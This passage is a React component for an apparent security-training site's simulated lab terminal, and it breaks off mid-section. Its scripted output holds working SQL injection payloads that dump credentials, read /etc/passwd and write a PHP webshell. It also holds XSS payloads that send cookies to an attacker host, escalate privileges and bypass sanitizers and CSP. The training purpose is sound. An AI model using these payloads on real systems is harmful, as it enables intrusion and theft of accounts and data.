"use client";

import { useState, useEffect, useRef, useCallback } from "react";

/* ======================================================================
   类型
   ====================================================================== */
interface TerminalSimulatorProps {
  labId: string;
  labTitle: string;
  color: "cyan" | "danger" | "matrix" | "purple" | "warn";
  onClose: () => void;
}

interface TermLine {
  id: number;
  text: string;
  type: "system" | "success" | "error" | "warning" | "input" | "info" | "ai";
  timestamp: string;
}

/* ======================================================================
   靶场专属数据 — 每个靶场有独立的初始化/扫描/攻击/AI分析
   ====================================================================== */

/* ---------- 初始化序列 ---------- */
interface InitStep {
  text: string;
  type: TermLine["type"];
  delay: number;
}

const LAB_INIT: Record<string, InitStep[]> = {
  sqli: [
    { text: "╔══════════════════════════════════════════════════════════╗", type: "system", delay: 200 },
    { text: "║  CyberVerse Vuln Lab — SQL Injection Training Session  ║", type: "system", delay: 150 },
    { text: "╚══════════════════════════════════════════════════════════╝", type: "system", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "[SYS] Authenticating operator credentials...", type: "info", delay: 500 },
    { text: "[SYS] ✓ Auth success — Access Level: TRAINING", type: "success", delay: 300 },
    { text: "[DOCKER] Pulling image: cybervse/vuln-sqli:latest", type: "system", delay: 800 },
    { text: "[DOCKER] Container started: sqli-lab-{CONTAINER_ID}", type: "success", delay: 400 },
    { text: "[NET] Provisioning sandbox network...", type: "info", delay: 500 },
    { text: "[NET] ✓ Target: 10.0.3.{LAB_IP} — DVWA v1.10 (Damn Vulnerable Web App)", type: "success", delay: 400 },
    { text: "[DB] Initializing MySQL 5.7 database...", type: "info", delay: 600 },
    { text: "[DB] ✓ Schema loaded: dvwa (5 tables, 32 records)", type: "success", delay: 300 },
    { text: "[DB] Users table: 8 accounts (admin, gordonb, 1337, pablo, smithy...)", type: "info", delay: 200 },
    { text: "[AI] Loading SQLi detection patterns...", type: "warning", delay: 700 },
    { text: "[AI] ✓ CyberShield-v3 active — Monitoring 47 attack signatures", type: "success", delay: 400 },
    { text: "[SEC] Sandbox isolated — No external egress permitted", type: "success", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "  SQL INJECTION LAB — ENVIRONMENT READY", type: "warning", delay: 200 },
    { text: "  Target: DVWA Login & Search forms", type: "info", delay: 150 },
    { text: "  Difficulty progression: Low → Medium → High → Impossible", type: "info", delay: 150 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "", type: "system", delay: 100 },
    { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
  ],
  xss: [
    { text: "╔══════════════════════════════════════════════════════════╗", type: "system", delay: 200 },
    { text: "║  CyberVerse Vuln Lab — XSS Attack Training Session    ║", type: "system", delay: 150 },
    { text: "╚══════════════════════════════════════════════════════════╝", type: "system", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "[SYS] Authenticating operator credentials...", type: "info", delay: 500 },
    { text: "[SYS] ✓ Auth success — Access Level: TRAINING", type: "success", delay: 300 },
    { text: "[DOCKER] Pulling image: cybervse/vuln-xss:latest", type: "system", delay: 800 },
    { text: "[DOCKER] Container started: xss-lab-{CONTAINER_ID}", type: "success", delay: 400 },
    { text: "[NET] ✓ Target: 10.0.3.{LAB_IP} — Blog & Comment System (Node.js/Express)", type: "success", delay: 400 },
    { text: "[WEB] Starting Express.js application on port 3000...", type: "info", delay: 500 },
    { text: "[WEB] ✓ Routes: / (home), /post/:id, /comment, /profile, /search", type: "success", delay: 300 },
    { text: "[WEB] CSP Header: default-src 'self' (bypassable)", type: "warning", delay: 200 },
    { text: "[AI] Loading XSS detection patterns (DOM/Reflected/Stored)...", type: "warning", delay: 700 },
    { text: "[AI] ✓ CyberShield-v3 active — Monitoring 62 XSS signatures", type: "success", delay: 400 },
    { text: "[SEC] Sandbox isolated — Cookie stealing simulated locally", type: "success", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "  XSS ATTACK LAB — ENVIRONMENT READY", type: "warning", delay: 200 },
    { text: "  Target: Blog comment system, search bar, user profile", type: "info", delay: 150 },
    { text: "  Attack vectors: Reflected / Stored / DOM-based / CSP Bypass", type: "info", delay: 150 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "", type: "system", delay: 100 },
    { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
  ],
  ssrf: [
    { text: "╔══════════════════════════════════════════════════════════╗", type: "system", delay: 200 },
    { text: "║  CyberVerse Vuln Lab — SSRF Attack Training Session   ║", type: "system", delay: 150 },
    { text: "╚══════════════════════════════════════════════════════════╝", type: "system", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "[SYS] ✓ Auth success — Access Level: TRAINING", type: "success", delay: 400 },
    { text: "[DOCKER] Container started: ssrf-lab-{CONTAINER_ID}", type: "success", delay: 600 },
    { text: "[NET] ✓ Target: 10.0.3.{LAB_IP} — URL Preview Service (Flask/Python)", type: "success", delay: 400 },
    { text: "[NET] Internal services discovered:", type: "info", delay: 300 },
    { text: "[NET]   → 10.0.3.200:9000  (MinIO S3 API)", type: "warning", delay: 200 },
    { text: "[NET]   → 10.0.3.201:6379  (Redis)", type: "warning", delay: 200 },
    { text: "[NET]   → 169.254.169.254   (Cloud Metadata)", type: "warning", delay: 200 },
    { text: "[WEB] ✓ Endpoint: /api/fetch?url=<user_input>", type: "success", delay: 300 },
    { text: "[WEB] URL validation: hostname blacklist (bypassable)", type: "warning", delay: 200 },
    { text: "[AI] ✓ CyberShield-v3 active — Monitoring SSRF indicators", type: "success", delay: 400 },
    { text: "", type: "system", delay: 100 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "  SSRF LAB — ENVIRONMENT READY", type: "warning", delay: 200 },
    { text: "  Target: URL preview service with internal network access", type: "info", delay: 150 },
    { text: "  Objectives: Internal scan / Cloud metadata / Redis access", type: "info", delay: 150 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "", type: "system", delay: 100 },
    { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
  ],
  upload: [
    { text: "╔══════════════════════════════════════════════════════════╗", type: "system", delay: 200 },
    { text: "║  CyberVerse Vuln Lab — File Upload Training Session   ║", type: "system", delay: 150 },
    { text: "╚══════════════════════════════════════════════════════════╝", type: "system", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "[SYS] ✓ Auth success — Access Level: TRAINING", type: "success", delay: 400 },
    { text: "[DOCKER] Container started: upload-lab-{CONTAINER_ID}", type: "success", delay: 600 },
    { text: "[NET] ✓ Target: 10.0.3.{LAB_IP} — File Sharing Platform (PHP/Apache)", type: "success", delay: 400 },
    { text: "[WEB] Upload endpoint: /upload.php (multipart/form-data)", type: "info", delay: 300 },
    { text: "[WEB] Allowed extensions: .jpg, .png, .gif, .pdf (bypassable)", type: "warning", delay: 200 },
    { text: "[WEB] MIME type validation: enabled (bypassable)", type: "warning", delay: 200 },
    { text: "[WEB] Content-type check: magic bytes only", type: "warning", delay: 200 },
    { text: "[WEB] Upload directory: /var/www/html/uploads/ (executable)", type: "error", delay: 200 },
    { text: "[AI] ✓ CyberShield-v3 active — Monitoring upload patterns", type: "success", delay: 400 },
    { text: "", type: "system", delay: 100 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "  FILE UPLOAD LAB — ENVIRONMENT READY", type: "warning", delay: 200 },
    { text: "  Target: File sharing service with weak validation", type: "info", delay: 150 },
    { text: "  Objectives: Extension bypass / MIME spoof / Webshell upload", type: "info", delay: 150 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "", type: "system", delay: 100 },
    { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
  ],
  rce: [
    { text: "╔══════════════════════════════════════════════════════════╗", type: "system", delay: 200 },
    { text: "║  CyberVerse Vuln Lab — Command Execution Training    ║", type: "system", delay: 150 },
    { text: "╚══════════════════════════════════════════════════════════╝", type: "system", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "[SYS] ✓ Auth success — Access Level: TRAINING", type: "success", delay: 400 },
    { text: "[DOCKER] Container started: rce-lab-{CONTAINER_ID}", type: "success", delay: 600 },
    { text: "[NET] ✓ Target: 10.0.3.{LAB_IP} — Network Diagnostic Tool (Python/Flask)", type: "success", delay: 400 },
    { text: "[WEB] Endpoint: /api/ping?host=<user_input>", type: "info", delay: 300 },
    { text: "[WEB] Input sanitization: blacklist filter (bypassable)", type: "warning", delay: 200 },
    { text: "[WEB] Backend execution: os.system('ping -c 3 ' + host)", type: "error", delay: 200 },
    { text: "[WEB] Additional: /api/lookup (DNS lookup, also vulnerable)", type: "warning", delay: 200 },
    { text: "[AI] ✓ CyberShield-v3 active — RCE detection enabled", type: "success", delay: 400 },
    { text: "", type: "system", delay: 100 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "  COMMAND EXECUTION LAB — ENVIRONMENT READY", type: "warning", delay: 200 },
    { text: "  Target: Network diagnostic tool with OS command injection", type: "info", delay: 150 },
    { text: "  Objectives: Command injection / Filter bypass / Reverse shell", type: "info", delay: 150 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "", type: "system", delay: 100 },
    { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
  ],
  "cve-sim": [
    { text: "╔══════════════════════════════════════════════════════════╗", type: "system", delay: 200 },
    { text: "║  CyberVerse Vuln Lab — CVE Simulation Training        ║", type: "system", delay: 150 },
    { text: "╚══════════════════════════════════════════════════════════╝", type: "system", delay: 300 },
    { text: "", type: "system", delay: 100 },
    { text: "[SYS] ✓ Auth success — Access Level: ADVANCED_TRAINING", type: "success", delay: 400 },
    { text: "[DOCKER] Pulling multi-container stack...", type: "system", delay: 800 },
    { text: "[DOCKER] Container 1: log4shell-victim (Java 8 + Log4j 2.14.1)", type: "warning", delay: 500 },
    { text: "[DOCKER] Container 2: spring4shell-app (Spring Framework 5.3.17)", type: "warning", delay: 500 },
    { text: "[DOCKER] Container 3: attacker-infra (LDAP/RMI server)", type: "error", delay: 500 },
    { text: "[NET] ✓ Victim A: 10.0.3.{LAB_IP} (Log4Shell target)", type: "success", delay: 300 },
    { text: "[NET] ✓ Victim B: 10.0.3.{LAB_IP2} (Spring4Shell target)", type: "success", delay: 300 },
    { text: "[NET] ✓ Attacker: 10.0.3.99 (Malicious LDAP/RMI server)", type: "success", delay: 300 },
    { text: "[AI] ✓ CyberShield-v3 active — CVE exploit chain monitoring", type: "success", delay: 400 },
    { text: "", type: "system", delay: 100 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "  CVE SIMULATION LAB — ENVIRONMENT READY", type: "warning", delay: 200 },
    { text: "  Scenarios: Log4Shell (CVE-2021-44228) / Spring4Shell (CVE-2022-22965)", type: "info", delay: 150 },
    { text: "  WARNING: These are real-world critical vulnerabilities", type: "error", delay: 150 },
    { text: "═══════════════════════════════════════════════════════", type: "system", delay: 200 },
    { text: "", type: "system", delay: 100 },
    { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
  ],
};

/* ---------- 通用初始化兜底 ---------- */
const DEFAULT_INIT: InitStep[] = [
  { text: "╔══════════════════════════════════════════════════╗", type: "system", delay: 200 },
  { text: "║       CyberVerse Vuln Lab — Secure Terminal     ║", type: "system", delay: 150 },
  { text: "╚══════════════════════════════════════════════════╝", type: "system", delay: 300 },
  { text: "", type: "system", delay: 100 },
  { text: "[SYS] ✓ Auth success — Access Level: TRAINING", type: "success", delay: 400 },
  { text: "[DOCKER] ✓ Container Runtime Active — ID: {CONTAINER_ID}", type: "success", delay: 600 },
  { text: "[NET] ✓ Target IP Allocated — 10.0.3.{LAB_IP}", type: "success", delay: 400 },
  { text: "[AI] ✓ AI Threat Detection Enabled — CyberShield-v3", type: "success", delay: 500 },
  { text: "[SEC] ✓ Sandbox isolated — No external egress", type: "success", delay: 300 },
  { text: "", type: "system", delay: 100 },
  { text: 'Type "help" for available commands or begin your attack.', type: "ai", delay: 400 },
];

/* ---------- 靶场专属命令响应 ---------- */
interface CmdResponse {
  lines: { text: string; type: TermLine["type"]; delay?: number }[];
}

const LAB_COMMANDS: Record<string, Record<string, CmdResponse>> = {
  sqli: {
    help: {
      lines: [
        { text: "┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "│ SQL Injection Lab — Available Commands            │", type: "system" },
        { text: "├──────────────────────────────────────────────────┤", type: "system" },
        { text: "│  scan       — Nmap scan target web server        │", type: "info" },
        { text: "│  recon      — Fingerprint web app & forms        │", type: "info" },
        { text: "│  exploit    — Launch SQL injection attack        │", type: "warning" },
        { text: "│  blind      — Blind SQL injection demo           │", type: "warning" },
        { text: "│  union      — UNION-based injection demo         │", type: "warning" },
        { text: "│  analyze    — AI vulnerability analysis          │", type: "ai" },
        { text: "│  defend     — Show defense & remediation         │", type: "ai" },
        { text: "│  status     — Lab environment status             │", type: "info" },
        { text: "│  clear      — Clear terminal                     │", type: "system" },
        { text: "│  exit       — Terminate lab session              │", type: "error" },
        { text: "└──────────────────────────────────────────────────┘", type: "system" },
      ],
    },
    scan: {
      lines: [
        { text: "[SCAN] Nmap 7.94 scan on 10.0.3.{LAB_IP}...", type: "info" },
        { text: "[SCAN] PORT      STATE   SERVICE       VERSION", type: "system" },
        { text: "[SCAN] 22/tcp    open    ssh           OpenSSH 7.9", type: "success" },
        { text: "[SCAN] 80/tcp    open    http          Apache 2.4.49", type: "success" },
        { text: "[SCAN] 443/tcp   open    https         Apache 2.4.49", type: "success" },
        { text: "[SCAN] 3306/tcp  open    mysql         MySQL 5.7.36", type: "warning" },
        { text: "[SCAN] 8080/tcp  open    http-proxy    Nginx 1.18 (reverse proxy)", type: "success" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] OS: Linux 4.15 | Web: DVWA v1.10 | PHP 7.4.3", type: "info" },
        { text: "[AI] Risk: MySQL port exposed — common in misconfigured LAMP stacks", type: "ai" },
      ],
    },
    recon: {
      lines: [
        { text: "[RECON] Enumerating web application endpoints...", type: "info" },
        { text: "[RECON] GET  /                    → 200 (Login page)", type: "success" },
        { text: "[RECON] GET  /login.php           → 200 (Auth form: username + password)", type: "success" },
        { text: "[RECON] POST /login.php           → 302 (Login handler — VULNERABLE)", type: "warning" },
        { text: "[RECON] GET  /vulnerabilities/sqli/?id=1&Submit=Submit → 200", type: "warning" },
        { text: "[RECON] GET  /search.php?q=       → 200 (Search — Error-based SQLi)", type: "warning" },
        { text: "[RECON] GET  /setup.php           → 200 (Database reset)", type: "info" },
        { text: "[RECON]", type: "system" },
        { text: "[RECON] Parameter 'id' in /vulnerabilities/sqli/ is injectable", type: "error" },
        { text: "[RECON] MySQL error disclosure detected in search results", type: "warning" },
        { text: "[AI] Attack surface: 2 confirmed injectable parameters found", type: "ai" },
      ],
    },
    exploit: {
      lines: [
        { text: "[ATK] Target: 10.0.3.{LAB_IP}/vulnerabilities/sqli/", type: "info" },
        { text: "[ATK] Testing parameter: id", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Confirm injection point", type: "info" },
        { text: "[ATK] Request: ?id=1'&Submit=Submit", type: "warning" },
        { text: "[ATK] Response: \"You have an error in your SQL syntax\"", type: "success" },
        { text: "[ATK] ✓ Injection confirmed — MySQL error-based", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Extract database version", type: "info" },
        { text: "[ATK] Payload: ?id=1' UNION SELECT null,version()-- -", type: "warning" },
        { text: "[ATK] Response: \"5.7.36-0ubuntu0.18.04.1\"", type: "success" },
        { text: "[ATK] ✓ MySQL 5.7.36 confirmed", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Enumerate databases", type: "info" },
        { text: "[ATK] Payload: ?id=1' UNION SELECT null,schema_name FROM information_schema.schemata-- -", type: "warning" },
        { text: "[ATK] Databases: dvwa, information_schema, mysql, performance_schema", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 4: Dump user credentials", type: "info" },
        { text: "[ATK] Payload: ?id=1' UNION SELECT user,password FROM dvwa.users-- -", type: "warning" },
        { text: "[ATK] ┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "[ATK] │ admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (md5)  │", type: "error" },
        { text: "[ATK] │ gordonb  | e99a18c428cb38d5f260853678922e03 (md5)  │", type: "error" },
        { text: "[ATK] │ 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b (md5)  │", type: "error" },
        { text: "[ATK] └──────────────────────────────────────────────────┘", type: "system" },
        { text: "[ATK] Cracking md5: 5f4dcc3b5aa765d61d8327deb882cf99 → \"password\"", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  ATTACK SUCCESSFUL — FLAG CAPTURED               ║", type: "success" },
        { text: "║   FLAG: CV{sqli_un10n_b4s3d_d4t4_3xf1l}             ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
        { text: "", type: "system" },
        { text: "[AI] Attack classified: SQL Injection — Union-based data exfiltration", type: "ai" },
        { text: "[AI] Root cause: User input directly concatenated into SQL query", type: "ai" },
        { text: "[AI] Fix: Use parameterized queries (prepared statements)", type: "ai" },
        { text: "[AI] Risk Score: 9.8/10 — Critical: Full database compromise", type: "ai" },
      ],
    },
    blind: {
      lines: [
        { text: "[ATK] Switching to Blind SQL Injection mode...", type: "info" },
        { text: "[ATK] Target: /vulnerabilities/sqli_blind/", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Boolean-based blind test", type: "info" },
        { text: "[ATK] Payload: ?id=1' AND 1=1-- -  → \"User exists\"", type: "warning" },
        { text: "[ATK] Payload: ?id=1' AND 1=2-- -  → \"User missing\"", type: "warning" },
        { text: "[ATK] ✓ Boolean oracle confirmed", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Extract database name character by character", type: "info" },
        { text: "[ATK] SUBSTRING(DATABASE(),1,1) = 'd' → TRUE", type: "warning" },
        { text: "[ATK] SUBSTRING(DATABASE(),2,1) = 'v' → TRUE", type: "warning" },
        { text: "[ATK] SUBSTRING(DATABASE(),3,1) = 'w' → TRUE", type: "warning" },
        { text: "[ATK] SUBSTRING(DATABASE(),4,1) = 'a' → TRUE", type: "warning" },
        { text: "[ATK] ✓ Database name: dvwa", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Time-based blind (BENCHMARK)", type: "info" },
        { text: "[ATK] Payload: ?id=1' AND IF(1=1,SLEEP(3),0)-- -", type: "warning" },
        { text: "[ATK] Response delay: 3.02s ✓ Time oracle works", type: "success" },
        { text: "", type: "system" },
        { text: "[AI] Blind SQLi is stealthier but slower — automating with sqlmap recommended", type: "ai" },
      ],
    },
    union: {
      lines: [
        { text: "[ATK] UNION-based SQL Injection deep dive", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Determine column count", type: "info" },
        { text: "[ATK] ?id=1' ORDER BY 1-- -  → OK", type: "warning" },
        { text: "[ATK] ?id=1' ORDER BY 2-- -  → OK", type: "warning" },
        { text: "[ATK] ?id=1' ORDER BY 3-- -  → ERROR", type: "error" },
        { text: "[ATK] ✓ Column count: 2", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Find visible columns", type: "info" },
        { text: "[ATK] ?id=1' UNION SELECT 'AAA','BBB'-- -", type: "warning" },
        { text: "[ATK] Response shows: First name: AAA | Surname: BBB", type: "success" },
        { text: "[ATK] ✓ Both columns are visible in output", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Read system files (FILE privilege required)", type: "info" },
        { text: "[ATK] ?id=1' UNION SELECT null,LOAD_FILE('/etc/passwd')-- -", type: "warning" },
        { text: "[ATK] root:x:0:0:root:/root:/bin/bash", type: "error" },
        { text: "[ATK] www-data:x:33:33::/var/www:/usr/sbin/nologin", type: "error" },
        { text: "[ATK] mysql:x:27:27::/var/lib/mysql:/bin/false", type: "error" },
        { text: "[ATK] ✓ System files readable — FILE privilege granted", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 4: Write webshell (INTO OUTFILE)", type: "info" },
        { text: "[ATK] ?id=1' UNION SELECT null,'<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/shell.php'-- -", type: "warning" },
        { text: "[ATK] ✓ Webshell written: /shell.php?c=whoami → www-data", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  ADVANCED EXPLOIT — FLAG CAPTURED                 ║", type: "success" },
        { text: "║   FLAG: CV{sqli_f1l3_r34d_w3bsh3ll_wr1t3}           ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    analyze: {
      lines: [
        { text: "[AI] Running SQL Injection vulnerability analysis...", type: "ai" },
        { text: "[AI] ┌─────────────────────────────────────────────────────┐", type: "ai" },
        { text: "[AI] │            Vulnerability Assessment Report            │", type: "ai" },
        { text: "[AI] ├─────────────────────────────────────────────────────┤", type: "ai" },
        { text: "[AI] │ Union-based SQLi   : CRITICAL  (9.8) — Data leak    │", type: "error" },
        { text: "[AI] │ Blind Boolean SQLi : HIGH      (8.1) — Data leak    │", type: "warning" },
        { text: "[AI] │ Blind Time SQLi    : HIGH      (7.5) — Data leak    │", type: "warning" },
        { text: "[AI] │ Error-based SQLi   : MEDIUM    (6.4) — Info disc    │", type: "info" },
        { text: "[AI] │ FILE privilege     : CRITICAL (10.0) — RCE via shell│", type: "error" },
        { text: "[AI] └─────────────────────────────────────────────────────┘", type: "ai" },
        { text: "[AI]", type: "system" },
        { text: "[AI] Attack chain: SQLi → DB dump → File read → Webshell → RCE", type: "ai" },
        { text: "[AI] Priority fix: Parameterized queries + Revoke FILE privilege", type: "ai" },
      ],
    },
    defend: {
      lines: [
        { text: "[AI] ═══ SQL Injection Defense & Remediation ═══", type: "ai" },
        { text: "", type: "system" },
        { text: "[DEF] 1. Parameterized Queries (Prepared Statements):", type: "success" },
        { text: '[DEF]    Python: cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))', type: "success" },
        { text: '[DEF]    PHP:    $stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");', type: "success" },
        { text: '[DEF]    Java:   PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id=?");', type: "success" },
        { text: "", type: "system" },
        { text: "[DEF] 2. Input Validation:", type: "info" },
        { text: "[DEF]    Whitelist allowed characters (e.g., only digits for ID params)", type: "info" },
        { text: "[DEF]    Reject: ', \", ;, --, /*, UNION, SELECT, DROP", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 3. Least Privilege:", type: "info" },
        { text: "[DEF]    Revoke FILE privilege from webapp DB user", type: "info" },
        { text: "[DEF]    REVOKE FILE ON *.* FROM 'dvwa'@'localhost';", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 4. WAF Rules:", type: "info" },
        { text: "[DEF]    Block: UNION SELECT, OR 1=1, SLEEP(), BENCHMARK(), LOAD_FILE", type: "info" },
        { text: "[DEF]    Alert on: information_schema, INTO OUTFILE, INTO DUMPFILE", type: "info" },
      ],
    },
    status: {
      lines: [
        { text: "[STATUS] ═══ SQL Injection Lab Environment ═══", type: "info" },
        { text: "[STATUS]   Container:  RUNNING (sqli-lab-{CONTAINER_ID})", type: "success" },
        { text: "[STATUS]   Target:     10.0.3.{LAB_IP} (DVWA v1.10)", type: "info" },
        { text: "[STATUS]   DB:         MySQL 5.7.36 (4 databases)", type: "info" },
        { text: "[STATUS]   Tables:     users(8), guestbook(2), pages(5), config(12)", type: "info" },
        { text: "[STATUS]   AI Engine:  CyberShield-v3 ACTIVE", type: "ai" },
        { text: "[STATUS]   Isolation:  ENFORCED (no egress)", type: "success" },
      ],
    },
  },

  xss: {
    help: {
      lines: [
        { text: "┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "│ XSS Attack Lab — Available Commands              │", type: "system" },
        { text: "├──────────────────────────────────────────────────┤", type: "system" },
        { text: "│  scan       — Port scan & web fingerprint       │", type: "info" },
        { text: "│  reflected  — Reflected XSS attack demo         │", type: "warning" },
        { text: "│  stored     — Stored XSS attack demo            │", type: "warning" },
        { text: "│  dom        — DOM-based XSS attack demo         │", type: "warning" },
        { text: "│  bypass     — CSP bypass techniques             │", type: "warning" },
        { text: "│  analyze    — AI vulnerability analysis         │", type: "ai" },
        { text: "│  defend     — Show defense & remediation        │", type: "ai" },
        { text: "│  status     — Lab environment status            │", type: "info" },
        { text: "│  clear      — Clear terminal                    │", type: "system" },
        { text: "│  exit       — Terminate lab session             │", type: "error" },
        { text: "└──────────────────────────────────────────────────┘", type: "system" },
      ],
    },
    scan: {
      lines: [
        { text: "[SCAN] Nmap 7.94 scan on 10.0.3.{LAB_IP}...", type: "info" },
        { text: "[SCAN] PORT      STATE   SERVICE       VERSION", type: "system" },
        { text: "[SCAN] 22/tcp    open    ssh           OpenSSH 8.2", type: "success" },
        { text: "[SCAN] 3000/tcp  open    http          Node.js Express", type: "success" },
        { text: "[SCAN] 27017/tcp open    mongodb       MongoDB 5.0", type: "warning" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Web: Express.js | Template: EJS | DB: MongoDB", type: "info" },
        { text: "[AI] MongoDB exposed — could enable NoSQL injection too", type: "ai" },
      ],
    },
    reflected: {
      lines: [
        { text: "[ATK] Reflected XSS — /search?q= parameter", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Test basic HTML injection", type: "info" },
        { text: "[ATK] Payload: /search?q=<h1>test</h1>", type: "warning" },
        { text: "[ATK] Response: <h1>test</h1> rendered in page ✓", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Basic script injection", type: "info" },
        { text: "[ATK] Payload: /search?q=<script>alert('XSS')</script>", type: "warning" },
        { text: "[ATK] Response: JavaScript executed — popup shown ✓", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Cookie stealing payload", type: "info" },
        { text: "[ATK] Payload: <script>new Image().src='http://10.0.3.99/steal?c='+document.cookie</script>", type: "warning" },
        { text: "[ATK] Attacker server received: session=eyJhbGciOiJIUzI1NiJ9...", type: "error" },
        { text: "[ATK] ✓ Session hijacking possible via reflected XSS", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  REFLECTED XSS — FLAG CAPTURED                    ║", type: "success" },
        { text: "║   FLAG: CV{r3fl3ct3d_xss_c00k13_st34l}               ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    stored: {
      lines: [
        { text: "[ATK] Stored XSS — Blog comment system", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Identify comment form", type: "info" },
        { text: "[ATK] POST /comment { name: \"tester\", body: \"<payload>\" }", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Inject persistent payload", type: "info" },
        { text: "[ATK] Payload: <img src=x onerror=\"fetch('/api/profile',{method:'PUT',body:JSON.stringify({role:'admin'})})\">", type: "warning" },
        { text: "[ATK] Comment stored in MongoDB ✓", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Victim views the comment page", type: "info" },
        { text: "[ATK] [SIMULATION] User 'john_doe' loaded the blog post", type: "info" },
        { text: "[ATK] [SIMULATION] onerror triggered — role escalated to admin", type: "error" },
        { text: "[ATK] ✓ Privilege escalation via Stored XSS", type: "error" },
        { text: "", type: "system" },
        { text: "[AI] Stored XSS is more dangerous — affects all users who view the page", type: "ai" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  STORED XSS — FLAG CAPTURED                       ║", type: "success" },
        { text: "║   FLAG: CV{st0r3d_xss_pr1v_3sc4l4t10n}               ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    dom: {
      lines: [
        { text: "[ATK] DOM-based XSS — Client-side injection", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Vulnerable code found:", type: "info" },
        { text: "[ATK]   document.getElementById('output').innerHTML = location.hash.slice(1);", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Craft URL with payload", type: "info" },
        { text: "[ATK] Payload: /post/1#<img src=x onerror=alert(document.domain)>", type: "warning" },
        { text: "[ATK] ✓ innerHTML renders the malicious image tag", type: "success" },
        { text: "[ATK] ✓ onerror fires — DOM-based XSS confirmed", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Mutation XSS (mXSS) bypass", type: "info" },
        { text: "[ATK] Payload: <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", type: "warning" },
        { text: "[ATK] ✓ Browser HTML parser mutates the DOM — sanitizer bypassed", type: "error" },
        { text: "", type: "system" },
        { text: "[AI] DOM XSS never reaches server — WAF cannot detect it", type: "ai" },
        { text: "[AI] Fix: Use textContent instead of innerHTML, or sanitize with DOMPurify", type: "ai" },
      ],
    },
    bypass: {
      lines: [
        { text: "[ATK] CSP Bypass Techniques", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Current CSP: default-src 'self'; script-src 'self' https://cdn.example.com", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 1: JSONP endpoint on allowed domain", type: "info" },
        { text: "[ATK] <script src=\"https://cdn.example.com/api/callback?func=alert\">", type: "warning" },
        { text: "[ATK] ✓ JSONP allows arbitrary function execution", type: "success" },
